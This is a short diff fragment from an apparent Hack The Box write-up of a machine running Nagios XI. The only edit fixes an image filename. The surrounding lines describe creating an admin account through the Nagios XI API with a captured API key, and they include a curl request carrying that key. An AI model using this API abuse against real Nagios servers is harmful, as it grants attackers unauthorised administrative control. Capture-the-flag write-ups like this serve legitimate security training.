@@ -445,7 +445,7 @@ curl -s -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=I
 
 We successfully created the user `xhi4m` with `admin` privileges! Let's login:
 
-![](login_xhi4m)
+![](login_xhi4m.png)
 
 ```bash
 curl -XGET "https://nagios.monitored.htb/nagiosxi/api/v1/awesome/example/data1/data2?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1"
